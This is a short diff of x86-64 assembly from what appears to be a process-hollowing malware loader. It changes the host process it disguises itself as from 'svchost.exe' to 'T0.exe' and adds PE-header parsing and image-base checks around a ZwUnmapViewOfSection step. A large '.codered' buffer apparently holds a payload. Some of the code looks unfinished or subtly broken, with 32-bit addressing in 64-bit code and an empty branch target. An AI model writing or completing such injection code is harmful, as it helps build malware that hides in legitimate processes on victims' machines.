@@ -2,7 +2,7 @@
 global WinMain
 
 section .BSS
-	process db "svchost.exe",0,0
+	process db "T0.exe",0,0
 	
 section .data	
 	
@@ -163,8 +163,10 @@ section .data
     AddressEntryPoint times 8                        dd 0
     alloc times 8                                    dd 0
     lpImageBase times 8                              dd 0
-    lpPreferableBase 8                               dd 0
+    VA times 8                                       dd 0
+    lpAllocatedBaset times 8                         dd 0
 	
+	lpPreferableBase dd 0x400000
 section .codered
 	CodeRed:
 	Buffer2 times 800000                          db 0
@@ -320,8 +322,33 @@ section .deccode
 	call r12
 	
 	
+	mov rax, [lpImageBase]
+	mov rcx, [lpImageBase]
+	xor rdi,rdi
+	add rax, 0x3c
+	mov edi, [eax]
+	mov rax, rcx
+	add eax, edi
+	add rax, 0x38
+	xor rdi, rdi
+	mov edi, [eax]
+	mov [VA], eax
 	
 	;ZwUnmapViewOfSection
+	mov rax, [lpPreferableBase]
+	cmp rax, [lpPebImageBase]
+	jne lpAllocatedBase
+
+	
+	
+	
+	
+	
+	
+	
+	
+	lpAllocatedBase:
+	
 	
 	
 	
